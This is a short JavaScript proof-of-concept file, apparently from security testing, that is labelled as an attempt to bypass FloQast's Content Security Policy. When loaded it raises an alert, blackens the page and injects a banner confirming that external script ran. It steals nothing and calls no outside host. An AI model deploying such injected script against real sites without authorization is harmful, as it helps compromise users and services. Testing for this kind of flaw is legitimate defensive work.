// Simple XSS PoC - FloQast CSP Bypass Attempt
alert("🔥 External JavaScript Loaded - XSS Test");

// Optional DOM manipulation
document.body.style.backgroundColor = "black";
document.body.innerHTML += `
  <div style="position:fixed;top:10px;left:10px;color:white;font-size:20px;background:red;padding:10px;z-index:9999;">
    🚨 External JS Executed Successfully
  </div>
`;
console.log("✅ Payload Executed from test.js");
